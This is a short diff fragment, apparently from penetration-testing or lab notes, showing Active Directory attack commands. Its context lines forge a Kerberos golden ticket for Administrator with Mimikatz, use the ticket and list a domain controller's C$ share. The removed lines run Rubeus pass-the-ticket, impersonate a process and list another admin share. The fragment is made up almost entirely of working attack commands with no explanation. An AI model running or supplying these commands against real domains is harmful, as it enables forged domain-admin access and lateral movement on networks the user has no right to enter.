@@ -21,10 +21,4 @@ kerberos::golden /user:Administrator /domain:dev.insomnia.io  /sid:S-1-5-21-2824
 
 kerberos_ticket_use C:\Users\Commando\Desktop\x64\MeMe.kirbi
 ls \\ad01.insomnia.io\c$
-
-Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
-Rubeus ptt /luid:0x82ece /ticket:[...snip...]
-ImpersonateProcess 1464
-ls \\[...snip...]k\c$
-
 ```
